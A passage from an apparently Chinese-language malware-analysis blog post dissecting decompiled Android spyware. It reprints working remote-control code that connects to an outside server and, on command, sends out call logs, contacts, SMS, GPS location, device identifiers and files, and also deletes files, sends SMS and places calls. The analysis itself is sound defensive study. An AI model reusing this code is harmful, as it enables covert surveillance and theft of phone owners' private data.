        Socket socket = new Socket(InetAddress.getByName(&quot;www.roidsec.com&quot;), 5001);
        while(true) {
        label_5:
            outputstream = socket.getOutputStream();
            BufferedReader bufferreader = new BufferedReader(new InputStreamReader(socket.getInputStream(), &quot;GBK&quot;));
            arraychar = new char[256];
            length = bufferreader.read(arraychar);
            if(new String(arraychar, 0, length).equals(&quot;get_info&quot;)) {
                goto label_33;
            }
            if(new String(arraychar, 0, length).equals(&quot;getCallLogs&quot;)) {
                outputstream.write(&quot;result_Call&quot; + this.getCallLogs().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                continue;
            }
            if(new String(arraychar, 0, length).equals(&quot;getContactInfo&quot;)) {
                outputstream.write(&quot;result_Contact&quot; + this.getContactInfo().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                continue;
            }
            if(new String(arraychar, 0, length).equals(&quot;getMessagein&quot;)) {
                outputstream.write(&quot;result_Messagein&quot; + this.getSmsMessagesin().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                continue;
            }
            if(new String(arraychar, 0, length).equals(&quot;getMessageout&quot;)) {
                outputstream.write(&quot;result_Messageout&quot; + this.getSmsMessagesout().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                continue;
            }
            if(new String(arraychar, 0, length).equals(&quot;getInstalledApp&quot;)) {
                outputstream.write(&quot;result_InstalledApp&quot; + this.getInstalledApp().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                continue;
            }
            if(new String(arraychar, 0, length).equals(&quot;getkernelApp&quot;)) {
                outputstream.write(&quot;result_InstalledApp&quot; + this.getKernelApp().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                continue;
            }
            if(!new String(arraychar, 0, length).equals(&quot;getGPS&quot;)) {
                goto label_270;
            }
            break;
        }
    }
    catch(Exception v21) {
        goto label_49;
    }
    try {
        Object v10 = this.getSystemService(&quot;location&quot;);
        if(!((LocationManager)v10).isProviderEnabled(&quot;network&quot;) &amp;amp;&amp;amp; !((LocationManager)v10).isProviderEnabled(&quot;gps&quot;)) {
                goto label_5;
        }
        outputstream.write(&quot;result_GPS&quot; + this.getPhoneLocation().getBytes(&quot;GBK&quot;));
        outputstream.write(&quot;\n&quot;.getBytes());
        goto label_5;
    }
    catch(Exception v21) {
        try {
            v21.printStackTrace();
            goto label_5;
        label_270:
            if(!new String(arraychar, 0, 9).equals(&quot;getromDir&quot;)) {
                goto label_317;
            }
        }
        catch(Exception v21) {
            goto label_49;
        }
    }
    try {
        outputstream.write(&quot;result_Dir&quot; + this.getromDir(new String(arraychar, 9, length - 9)).getBytes(&quot;GBK&quot;));
        outputstream.write(&quot;\n&quot;.getBytes());
        goto label_5;
    }
    catch(Exception v21) {
        try {
            Log.e(&quot;PhoneIMEService&quot;, v21.toString());
            goto label_5;
        label_317:
            if(new String(arraychar, 0, 12).equals(&quot;getSdcardDir&quot;)) {
                outputstream.write(&quot;result_Dir&quot; + this.getSdcardDir(new String(arraychar, 12, length - 12)).getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                goto label_5;
            }
            if(new String(arraychar, 0, 10).equals(&quot;deletefile&quot;)) {
                outputstream.write(&quot;result_FileStatus&quot; + this.killFile(new String(arraychar, 10, length - 10)).getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                goto label_5;
            }
            if(new String(arraychar, 0, length).equals(&quot;SDCardInfo&quot;)) {
                outputstream.write(&quot;result_SdCardInfo&quot; + this.getSDCardMemory().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                goto label_5;
            }
            if(new String(arraychar, 0, length).equals(&quot;RomInfo&quot;)) {
                outputstream.write(&quot;result_romInfo&quot; + this.getRomMemory().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                goto label_5;
            }
            if(new String(arraychar, 0, length).equals(&quot;getScreenLocked&quot;)) {
                if(this.getSystemService(&quot;keyguard&quot;).inKeyguardRestrictedInputMode()) {
                    outputstream.write(&quot;ScreenStatus已锁屏&quot;.getBytes(&quot;GBK&quot;));
                    outputstream.write(&quot;\n&quot;.getBytes());
                    goto label_5;
                }
                outputstream.write(&quot;ScreenStatus未锁屏&quot;.getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                goto label_5;
            }
            if(new String(arraychar, 0, length).equals(&quot;getWiFiStatus&quot;)) {
                outputstream.write(&quot;result_WiFiInfo&quot; + this.getWiFiStatus().getBytes(&quot;GBK&quot;));
                outputstream.write(&quot;\n&quot;.getBytes());
                goto label_5;
            }
            if(new String(arraychar, 0, length).equals(&quot;openWiFi&quot;)) {
                v33 = this.getSystemService(&quot;wifi&quot;);
                if(((WifiManager)v33).isWifiEnabled()) {
                    goto label_5;
                }
                v33.setWifiEnabled(true);
                goto label_5;
            }
            if(new String(arraychar, 0, length).equals(&quot;closeWiFi&quot;)) {
                v33 = this.getSystemService(&quot;wifi&quot;);
                if(!((WifiManager)v33).isWifiEnabled()) {
                    goto label_5;
                }
                v33.setWifiEnabled(false);
                goto label_5;
            }
            if(!new String(arraychar, 0, length).equals(&quot;scanWiFi&quot;)) {
                goto label_676;
            }
            v33 = this.getSystemService(&quot;wifi&quot;);
            ((WifiManager)v33).startScan();
            List v32 = ((WifiManager)v33).getScanResults();
            StringBuilder v38 = new StringBuilder();
            if(v32 != null) {
                int v24 = 0;
                goto label_596;
            label_676:
                if(new String(arraychar, 0, 8).equals(&quot;LoadFile&quot;)) {
                    File v22 = new File(String.valueOf(Environment.getExternalStorageDirectory().getPath()) + new String(arraychar, 8, length - 8));
                    if(!v22.isFile()) {
                        goto label_5;
                    }
                    randomaccessfile = new RandomAccessFile(v22, &quot;r&quot;);
                    v20 = new byte[1024];
                    goto label_723;
                }
                else {
                    if(new String(arraychar, 0, 8).equals(&quot;ScreenShot&quot;)) {
                        goto label_5;
                    }
                    if(new String(arraychar, 0, 7).equals(&quot;SendSms&quot;)) {
                        String[] v15 = new String(arraychar, 7, length - 7).split(&quot;\\|&quot;);
                        outputstream.write(&quot;result_SmsStatus&quot; + this.SendSmsMes(v15[0], v15[1]).getBytes(&quot;GBK&quot;));
                        outputstream.write(&quot;\n&quot;.getBytes());
                        goto label_5;
                    }
                    else {
                        if(!new String(arraychar, 0, 9).equals(&quot;CallPhone&quot;)) {
                            goto label_5;
                        }
                        Intent v26 = new Intent(&quot;android.intent.action.CALL&quot;, Uri.parse(&quot;tel:&quot; + new String(arraychar, 9, length - 9)));
                        v26.setFlags(268435456);
                        this.startActivity(v26);
                        goto label_5;
                    label_33:
                        outputstream.write(this.getInitializes().getBytes(&quot;GBK&quot;));
                        outputstream.write(&quot;\n&quot;.getBytes());
                        goto label_5;
                        while(true) {
                        label_723:
                            int v30 = randomaccessfile.read(v20);
                            if(v30 == -1) {
                                goto label_5;
                            }
                        outputstream.write(v20, 0, v30);
                    }
                    label_596:
                        while(v24 &amp;lt; v32.size()) {
                            Object v31 = v32.get(v24);
                            v38 = v38.append(String.valueOf(v31.BSSID) + &quot;|&quot;)
                                .append(String.valueOf(v31.SSID) + &quot;|&quot;)
                                .append(String.valueOf(v31.capabilities) + &quot;|&quot;)
                                .append(String.valueOf(v31.frequency) + &quot;|&quot;)
                                .append(String.valueOf(v31.level) + &quot;~&quot;);
                            ++v24;
                        }
                    }
                }
            }
            outputstream.write(&quot;result_WiFiList&quot; + v38.toString().getBytes(&quot;GBK&quot;));
            outputstream.write(&quot;\n&quot;.getBytes());
            goto label_5;
        }
        catch(Exception v21) {
        label_49:
            Log.e(&quot;PhoneIMEService&quot;, v21.toString());
            return;
        }
    }
}
</code></pre><p>像这种代码多的方法，把它拆开来分析是比较容易的</p>
<p>开工</p>
<p>连接服务器</p>
<pre><code>Socket socket = new Socket(InetAddress.getByName(&quot;www.roidsec.com&quot;), 5001);
while(true) {
    label_5:
    outputstream = socket.getOutputStream();//获取服务器返回的数据
    BufferedReader bufferreader = new BufferedReader(new InputStreamReader(socket.getInputStream(), &quot;GBK&quot;));
    arraychar = new char[256];
    length = bufferreader.read(arraychar);
</code></pre><p>然后接下来是对arraychar的判断</p>
<p>一个一个来，不着急，每一行代码都有份</p>
<p>如果服务器返回的数据是<code>get_info</code>，跳到label_33</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;get_info&quot;)) {
    goto label_33;
}
</code></pre><p>找到label_33</p>
<pre><code>label_33:
    outputstream.write(this.getInitializes().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    goto label_5;
</code></pre><p>这一句看不出是要获得什么</p>
<pre><code>this.getInitializes()
</code></pre><p>看不出来的就跟过去，原来是各种手机的信息</p>
<pre><code>private String getInitializes() {
    String phone_buildmodel;
    String phone_buildversion;
    String phone_IMEI;
    String phone_networkoperator;
    String phone_number;
    StringBuilder phone_information = new StringBuilder();
    Object object_phone = this.getSystemService(&quot;phone&quot;);
    try {
        phone_number = ((TelephonyManager)object_phone).getLine1Number();  // 手机号
        phone_networkoperator = ((TelephonyManager)object_phone).getNetworkOperatorName();  // 注册的运营商名字
        phone_IMEI = ((TelephonyManager)object_phone).getDeviceId();  // IEMI
        phone_buildversion = Build$VERSION.RELEASE;  // 系统版本号
        phone_buildmodel = Build.MODEL;  // 手机型号
    }
    catch(Exception error) {
        Log.e(&quot;PhoneIMEService&quot;, error.toString());
    }
    phone_information
        .append(&quot;infos&quot;)
        .append(phone_networkoperator).append(&quot;|&quot;)
        .append(phone_number).append(&quot;|&quot;)
        .append(phone_IMEI).append(&quot;|&quot;)
        .append(this.getMaxCpuFreq()).append(&quot;|&quot;)
        .append(this.getTotalMemory()).append(&quot;|&quot;)
        .append(phone_buildversion).append(&quot;|&quot;)
        .append(phone_buildmodel);
        return phone_information.toString();  // 把上面的信息整理一下返回
}
</code></pre><p>其中包含两个作者自己写的方法</p>
<pre><code>private long getTotalMemory() {
    long v4;
    String v7 = &quot;/proc/meminfo&quot;;
    try {
        BufferedReader v3 = new BufferedReader(new FileReader(v7), 128);
        v4 = ((long)Integer.valueOf(v3.readLine().split(&quot;\\s+&quot;)[1]).intValue());
        v3.close();
    }
    catch(IOException v1) {
        Log.e(&quot;PhoneIMEService&quot;, v1.toString());
        v4 = 0;
    }
    return v4;
}
private String getMaxCpuFreq() {
    String v6 = &quot;&quot;;
    int v7 = 2;
    try {
        String[] v0 = new String[v7];
        v0[0] = &quot;/system/bin/cat&quot;;
        v0[1] = &quot;/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq&quot;;
        InputStream v3 = new ProcessBuilder(v0).start().getInputStream();
        byte[] v5 = new byte[32];
        while(v3.read(v5) != -1) {
            v6 = String.valueOf(v6) + new String(v5);
        }
        v3.close();
    }
    catch(IOException error) {
        Log.e(&quot;PhoneIMEService&quot;, error.toString());
        v6 = &quot;N/A&quot;;
    }
    return v6.trim();
}
</code></pre><p>如果服务器返回的数据是<code>getCallLogs</code>，返回<code>this.getCallLogs()</code>方法的返回值</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;getCallLogs&quot;)) {
    outputstream.write(&quot;result_Call&quot; + this.getCallLogs().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    continue;
}
</code></pre><p>跟过去，仔细读代码可以发现这是在获取受害者所有的通话记录</p>
<pre><code>private String getCallLogs() {
    String Call_type;
    StringBuilder allCallinformation = new StringBuilder();
    Cursor cursor = this.getContentResolver().query(CallLog$Calls.CONTENT_URI, new String[]{&quot;number&quot;, &quot;name&quot;, &quot;type&quot;, &quot;date&quot;, &quot;duration&quot;}, null, null, &quot;date DESC&quot;);// 查询所有的通话记录
    int i;
    for(i = 0; i &amp;lt; cursor.getCount(); ++i) {
        cursor.moveToPosition(i);
        String number = cursor.getString(0);  // 手机号
        String name = cursor.getString(1);  // 名字
        switch(cursor.getInt(2)) {
            case 1: {
                Call_type = &quot;来电&quot;;
                break;
            }
            case 2: {
                Call_type = &quot;去电&quot;;
                break;
            }
            case 3: {
                Call_type = &quot;未接来电&quot;;
                break;
            }
            default: {
                Call_type = &quot;未知类型&quot;;
                break;
            }
        }
        allCallinformation
            .append(number).append(&quot;|&quot;)
            .append(name).append(&quot;|&quot;)
            .append(Call_type).append(&quot;|&quot;)
            .append(new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;)
            .format(new Date(Long.parseLong(cursor.getString(3))))).append(&quot;|&quot;)
            .append(cursor.getString(4)).append(&quot;~&quot;);// 将每次获得的记录加到已经获得的信息后面
    }
    return allCallinformation.toString();  // 返回整理好的通话记录里的数据
}
</code></pre><p>如果服务器返回的数据是<code>getContactInfo</code>，就发送<code>this.getContactInfo()</code>方法返回的数据</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;getContactInfo&quot;)) {
    outputstream.write(&quot;result_Contact&quot; + this.getContactInfo().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    continue;
}
</code></pre><p>跟过去，读一遍后发现作用是获取通讯录里所有联系人的信息</p>
<pre><code>private String getContactInfo() {
    String[] NULL = null;
    Cursor cursor = this.getContentResolver().query(ContactsContract$Contacts.CONTENT_URI, NULL, ((String)NULL), NULL, ((String)NULL));
    StringBuilder allContactinformation = new StringBuilder();
    while(cursor.moveToNext()) {
        String Contact_id = cursor.getString(cursor.getColumnIndex(&quot;_id&quot;));
        allContactinformation.append(Contact_id).append(&quot;|&quot;).append(cursor.getString(cursor.getColumnIndex(&quot;display_name&quot;)));
        Cursor cursor1 = this.getContentResolver().query(ContactsContract$CommonDataKinds$Phone.CONTENT_URI, NULL, &quot;contact_id = &quot; + Contact_id, NULL, ((String)NULL));
        while(cursor1.moveToNext()) {
            allContactinformation.append(&quot;|&quot;).append(cursor1.getString(cursor1.getColumnIndex(&quot;data1&quot;)));
        }
        cursor1.close();
        Cursor cursor2 = this.getContentResolver().query(ContactsContract$CommonDataKinds$Email.CONTENT_URI, NULL, &quot;contact_id = &quot; + Contact_id, NULL, ((String)NULL));
        while(cursor2.moveToNext()) {
            allContactinformation.append(&quot;|&quot;).append(cursor2.getString(cursor2.getColumnIndex(&quot;data1&quot;)));
        }
        cursor2.close();
        allContactinformation.append(&quot;~&quot;);
    }
    cursor.close();
    return allContactinformation.toString();  // 获取通讯录里所有的联系人信息
}
</code></pre><p>如果服务器返回的数据是<code>getMessagein</code>，则向服务器发送<code>this.getSmsMessagesin()</code>方法返回的数据</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;getMessagein&quot;)) {
    outputstream.write(&quot;result_Messagein&quot; + this.getSmsMessagesin().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    continue;
}
</code></pre><p>跟过去，发现是获取收件箱的短信</p>
<pre><code>private String getSmsMessagesin() {
    String[] smsmessagein = new String[]{&quot;_id&quot;, &quot;address&quot;, &quot;person&quot;, &quot;body&quot;, &quot;date&quot;};
    StringBuilder allSmsMessageininformation = new StringBuilder();
    try {
        allSmsMessageininformation.append(this.processResults(this.getContentResolver().query(Uri.parse(&quot;content://sms/inbox&quot;), smsmessagein, null, null, &quot;date desc&quot;), true));
    }
    catch(SQLiteException error) {
        Log.d(&quot;PhoneIMEService&quot;, error.getMessage());
    }
    return allSmsMessageininformation.toString();
}
</code></pre><p>如果服务器返回的数据是<code>getMessageout</code>，则向服务器发送<code>this.getSmsMessagesout()</code>方法返回的数据</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;getMessageout&quot;)) {
    outputstream.write(&quot;result_Messageout&quot; + this.getSmsMessagesout().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    continue;
}
</code></pre><p>跟过去，发现是获取发件箱的短信</p>
<pre><code>private String getSmsMessagesout() {
    String[] smsmessageout = new String[]{&quot;_id&quot;, &quot;address&quot;, &quot;person&quot;, &quot;body&quot;, &quot;date&quot;};
    StringBuilder allSmsMessageoutinformation = new StringBuilder();
    try {
        allSmsMessageoutinformation.append(this.processResults(this.getContentResolver().query(Uri.parse(&quot;content://sms/sent&quot;), smsmessageout, null, null, &quot;date desc&quot;), true));
    }
    catch(SQLiteException error) {
        Log.d(&quot;PhoneIMEService&quot;, error.getMessage());
    }
    return allSmsMessageoutinformation.toString();
}
</code></pre><p>上面获取收件箱和发件箱短信共同的方法</p>
<pre><code>private StringBuilder processResults(Cursor cur, boolean all) {
    StringBuilder result = new StringBuilder();
    if(cur.moveToFirst()) {
        int person = cur.getColumnIndex(&quot;person&quot;);
        int address = cur.getColumnIndex(&quot;address&quot;);
        int body = cur.getColumnIndex(&quot;body&quot;);
        SimpleDateFormat simpledateformat = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
        do {
            String person_temp = cur.getString(person);
            String address_temp = cur.getString(address);
            String body_temp = cur.getString(body);
            String sendtime = simpledateformat.format(new Date(Long.parseLong(cur.getString(cur.getColumnIndex(&quot;date&quot;)))));
            result.append(&quot;发信人:&quot; + person_temp + &quot;\n&quot;);
            result.append(&quot;号码:&quot; + address_temp + &quot;\n&quot;);
            result.append(&quot;发信时间::&quot; + sendtime + &quot;\n&quot;);
            result.append(&quot;短信内容:&quot; + body_temp + &quot;\r\n&quot;);
            result.append(&quot;\r\n&quot;);
            if(cur.moveToNext()) {
                continue;
            }
            return result;
        }
        while(true);
    }
    else {
        result.append(&quot;no result!&quot;);
    }
    return result;
}
</code></pre><p>如果服务器返回的数据是<code>getInstalledApp</code>，则向服务器发送<code>this.getInstalledApp()</code>方法返回的数据</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;getInstalledApp&quot;)) {
    outputstream.write(&quot;result_InstalledApp&quot; + this.getInstalledApp().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    continue;
}
</code></pre><p>跟过去，这是在获取所有已安装非系统应用的应用信息</p>
<pre><code>private String getInstalledApp() {
    StringBuilder allInstalledappinformation = new StringBuilder();
    List list_package = this.getPackageManager().getInstalledPackages(0);
    int i;
    for(i = 0; i &amp;lt; list_package.size(); ++i) {
        Object object_temp = list_package.get(i);
        String appName = ((PackageInfo)object_temp).applicationInfo.loadLabel(this.getPackageManager()).toString();  // 应用名字
        String packageName = ((PackageInfo)object_temp).packageName;  // 应用包名
        String versionName = ((PackageInfo)object_temp).versionName;  // 版本号
        int versionCode = ((PackageInfo)object_temp).versionCode;  // 内部识别版本号
        if((((PackageInfo)object_temp).applicationInfo.flags &amp;amp; 1) == 0) {//flag为0为非系统应用，所以能执行if里的语句说明flag是0，0&amp;amp;1=0
            allInstalledappinformation
                .append(appName).append(&quot;|&quot;)
                .append(packageName).append(&quot;|&quot;)
                .append(versionName).append(&quot;|&quot;)
                .append(versionCode).append(&quot;~&quot;);
        }
    }
    return allInstalledappinformation.toString();  // 返回获得到的所有已安装非系统应用的应用信息
}
</code></pre><p>如果服务器返回的数据是<code>getkernelApp</code>，则向服务器发送<code>this.getKernelApp()</code>方法返回的数据</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;getkernelApp&quot;)) {
    outputstream.write(&quot;result_InstalledApp&quot; + this.getKernelApp().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    continue;
}
</code></pre><p>跟过去，发现是获取所有系统应用信息</p>
<pre><code>private String getKernelApp() {
    StringBuilder allKernelappinformation = new StringBuilder();
    List package_list = this.getPackageManager().getInstalledPackages(0);
    int i;
    for(i = 0; i &amp;lt; package_list.size(); ++i) {
        Object object_temp = package_list.get(i);
        String appName = ((PackageInfo)object_temp).applicationInfo.loadLabel(this.getPackageManager()).toString();  // 应用名字
        String packageName = ((PackageInfo)object_temp).packageName;  // 应用包名
        String versionName = ((PackageInfo)object_temp).versionName;  // 版本号
        int versionCode = ((PackageInfo)object_temp).versionCode;  // 内部识别版本号
        if((((PackageInfo)object_temp).applicationInfo.flags &amp;amp; 1) == 1) {
            allKernelappinformation
            .append(appName).append(&quot;|&quot;)
            .append(packageName).append(&quot;|&quot;)
            .append(versionName).append(&quot;|&quot;)
            .append(versionCode).append(&quot;~&quot;);
        }
    }
    return allKernelappinformation.toString();  // 返回所有系统应用信息
}
</code></pre><p>下面这个if相当于开启了另一种判断模式，上面是获取受害者信息的命令，下面是直接操作受害者手机的命令，比如删除之类的</p>
<p>如果服务器返回的数据不是<code>getGPS</code>，跳到label_270</p>
<pre><code>if(!new String(arraychar, 0, length).equals(&quot;getGPS&quot;)) {
    goto label_270;
}
</code></pre><p>这里有两种可能，等于或者不等于，都有可能的，万一服务器返回的真的就是<code>getGPS</code>呢？？？</p>
<p>那么就有一个很现实的问题，出现了这种情况，到底是先分析哪种可能，因为可能一个分支代码很少，另一个分支代码巨多</p>
<p>我多年经验：看颜值！！！！！！</p>
<p>所以我知道先分析服务器返回的是<code>getGPS</code>的情况</p>
<p>最后一行代码是break，所以跳出了这个while，跟着的刚好就是执行<code>getGPS</code>的方法</p>
<pre><code>Object object_GPS = this.getSystemService(&quot;location&quot;);
if(!((LocationManager)object_GPS).isProviderEnabled(&quot;network&quot;) &amp;amp;&amp;amp; !((LocationManager)object_GPS).isProviderEnabled(&quot;gps&quot;)) {
        goto label_5;
}
outputstream.write(&quot;result_GPS&quot; + this.getPhoneLocation().getBytes(&quot;GBK&quot;));
outputstream.write(&quot;\n&quot;.getBytes());
goto label_5;
</code></pre><p>其中<code>this.getPhoneLocation()</code>方法</p>
<pre><code>private String getPhoneLocation() throws Exception {
    StringBuilder locationinformation = new StringBuilder();
    Object object_location = this.getSystemService(&quot;location&quot;);
    Criteria criteria = new Criteria();
    criteria.setAccuracy(1);
    criteria.setAltitudeRequired(false);
    criteria.setBearingRequired(false);
    criteria.setCostAllowed(true);
    criteria.setPowerRequirement(1);
    Location location = ((LocationManager)object_location).getLastKnownLocation(((LocationManager)object_location).getBestProvider(criteria, true));
    if(((LocationManager)object_location).isProviderEnabled(&quot;gps&quot;)) {
        locationinformation.append(&quot;开启&quot;).append(&quot;|&quot;);
    }
    else {
        locationinformation.append(&quot;关闭&quot;).append(&quot;|&quot;);
    }
    if(location != null) {
        locationinformation.append(location.getLongitude()).append(&quot;|&quot;).append(location.getLatitude());
    }
    return locationinformation.toString();
}
</code></pre><p>获取了受害者的GPS信息后代码跳到了label_5，还记得这是哪个分支吗？</p>
<p><img src="Image/9.png" alt=""></p>
<p>重新进入了接收服务器命令的循环中</p>
<p>好了现在假设服务器返回的不是<code>getGPS</code></p>
<p>跟过去，如果前9字节不是<code>getromDir</code>就跳到label_317</p>
<pre><code>label_270:
    if(!new String(arraychar, 0, 9).equals(&quot;getromDir&quot;)) {
        goto label_317;
}
</code></pre><p>这里又有两种情况</p>
<p>你让我跳过去我就不跳过去</p>
<p>跳出上面的代码后</p>
<pre><code>outputstream.write(&quot;result_Dir&quot; + this.getromDir(new String(arraychar, 9, length - 9)).getBytes(&quot;GBK&quot;));
outputstream.write(&quot;\n&quot;.getBytes());
goto label_5;
</code></pre><p>这个方法是作者写的，参数是<code>getromDir</code>这个字符串后面的数据</p>
<pre><code>private String getromDir(String path) throws Exception {
    StringBuilder allRomdirinformation = new StringBuilder();
    File file = new File(String.valueOf(Environment.getDataDirectory().getPath()) + path);  // 参数为服务器返回来的路径
    if(file.isDirectory()) {
        File[] array_file = file.listFiles();  // 获取该路径下所有文件夹及文件
        SimpleDateFormat simpledateformat = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;);
        int i;
        for(i = 0; i &amp;lt; array_file.length; ++i) {
            allRomdirinformation
                .append(array_file[i].getName()).append(&quot;|&quot;)
                .append(array_file[i].length()).append(&quot;|&quot;)
                .append(simpledateformat.format(new Date(array_file[i].lastModified()))).append(&quot;~&quot;);
            }
    }
    return allRomdirinformation.toString();
}
</code></pre><p>来考虑第二种情况</p>
<p>跳到label_317，和刚才一样，各种命令</p>
<p>前12字节是<code>getSdcardDir</code>，这个用法得结合最开始那个获取所有应用的信息的方法一起分析</p>
<p>在安卓4.4以后，应用本身可以管理自己在外部存储的文件夹比如SD卡，不用获取<code>WRITE_EXTERNAL_STORAGE</code>权限，而以前的版本应用进行读写之类是需要权限的</p>
<p>下面只要<code>getSdcardDir</code>后面跟一个前面获取到的任意一个应用包名，就可以获取该应用在SD卡上的所有存储文件</p>
<pre><code>if(new String(arraychar, 0, 12).equals(&quot;getSdcardDir&quot;)) {
    outputstream.write(&quot;result_Dir&quot; + this.getSdcardDir(new String(arraychar, 12, length - 12)).getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    goto label_5;
}
</code></pre><p>跟过去<code>this.getSdcardDir</code>方法()</p>
<pre><code>private String getSdcardDir(String path) throws Exception {
    StringBuilder allSdcardDirinformation = new StringBuilder();
    if(Environment.getExternalStorageState().equals(&quot;mounted&quot;)) {
        File file = new File(String.valueOf(Environment.getExternalStorageDirectory().getPath()) + path);
        if(file.isDirectory()) {
            File[] file_temp = file.listFiles();
            SimpleDateFormat simpledateformat = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;);
            int i;
            for(i = 0; i &amp;lt; file_temp.length; ++i) {
                allSdcardDirinformation
                    .append(file_temp[i].getName()).append(&quot;|&quot;)
                    .append(file_temp[i].length()).append(&quot;|&quot;)
                    .append(simpledateformat.format(new Date(file_temp[i].lastModified()))).append(&quot;~&quot;);
            }
        }
    }
    return allSdcardDirinformation.toString();
}
</code></pre><p>服务器返回的前10字节是<code>deletefile</code>，执行<code>this.killFile()</code>方法</p>
<pre><code>if(new String(arraychar, 0, 10).equals(&quot;deletefile&quot;)) {
    outputstream.write(&quot;result_FileStatus&quot; + this.killFile(new String(arraychar, 10, length - 10)).getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    goto label_5;
}
</code></pre><p>跟过去，作用是删除SD卡里指定的文件</p>
<pre><code>private String killFile(String path) throws Exception {
    StringBuilder cmdexeResult = new StringBuilder();  // 删除指定的文件
    File file = new File(String.valueOf(Environment.getExternalStorageDirectory().getPath()) + path);
    if(file.isFile()) {
        if(file.delete()) {
            cmdexeResult.append(&quot;文件删除成功!&quot;);
        }
        else {
            cmdexeResult.append(&quot;文件删除失败!&quot;);
        }
    }
    return cmdexeResult.toString();
}
</code></pre><p>如果服务器返回的数据是<code>SDCardInfo</code>，向服务器发送<code>this.getSDCardMemory()</code>方法返回的数据</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;SDCardInfo&quot;)) {
    outputstream.write(&quot;result_SdCardInfo&quot; + this.getSDCardMemory().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    goto label_5;
}
</code></pre><p>跟过去，该方法返回的是SD卡的信息</p>
<pre><code>private String getSDCardMemory() {
    StringBuilder SDCardMemoryinformation = new StringBuilder();
    if(&quot;mounted&quot;.equals(Environment.getExternalStorageState())) {
        StatFs statfs = new StatFs(Environment.getExternalStorageDirectory().getPath());
        long BlockSize = ((long)statfs.getBlockSize());  // 大小，以字节为单位，一个文件系统
        long BlockCount = ((long)statfs.getBlockCount());  // 获取该区域可用的文件系统数
        long AvailableBlocks = ((long)statfs.getAvailableBlocks());  // 获取当前可用的存储空间
        SDCardMemoryinformation.append(BlockSize * BlockCount).append(&quot;|&quot;);
        SDCardMemoryinformation.append(BlockSize * AvailableBlocks);
    }
    return SDCardMemoryinformation.toString();
}
</code></pre><p>如果服务器返回的是<code>RomInfo</code>，则向服务器发送<code>this.getRomMemory()</code>方法返回的数据</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;RomInfo&quot;)) {
    outputstream.write(&quot;result_romInfo&quot; + this.getRomMemory().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    goto label_5;
}
</code></pre><p>跟过去，这是获取本机的data存储器的信息</p>
<pre><code>private String getRomMemory() {
    StringBuilder RomMemoryinformation = new StringBuilder();
    StatFs statfs = new StatFs(Environment.getDataDirectory().getPath());
    long BlockSize = ((long)statfs.getBlockSize());  // 大小，以字节为单位，一个文件系统
    long BlockCount = ((long)statfs.getBlockCount());  // 获取该区域可用的文件系统数
    long AvailableBlocks = ((long)statfs.getAvailableBlocks());  // 获取当前可用的存储空间
    RomMemoryinformation.append(BlockSize * BlockCount).append(&quot;|&quot;);
    RomMemoryinformation.append(BlockSize * AvailableBlocks);
    return RomMemoryinformation.toString();
}
</code></pre><p>如果服务器返回的是<code>getScreenLocked</code>，则向服务器发送是否锁屏的信息</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;getScreenLocked&quot;)) {
    if(this.getSystemService(&quot;keyguard&quot;).inKeyguardRestrictedInputMode()) {
        outputstream.write(&quot;ScreenStatus已锁屏&quot;.getBytes(&quot;GBK&quot;));
        outputstream.write(&quot;\n&quot;.getBytes());
        goto label_5;
    }
    outputstream.write(&quot;ScreenStatus未锁屏&quot;.getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    goto label_5;
}
</code></pre><p>如果服务器返回的是<code>getWiFiStatus</code>，则向服务器发送<code>this.getWiFiStatus()</code>方法返回的数据</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;getWiFiStatus&quot;)) {
    outputstream.write(&quot;result_WiFiInfo&quot; + this.getWiFiStatus().getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    goto label_5;
}
</code></pre><p>跟过去，可以看出来是获取wifi信息</p>
<pre><code>private String getWiFiStatus() {
    String wifi_state;
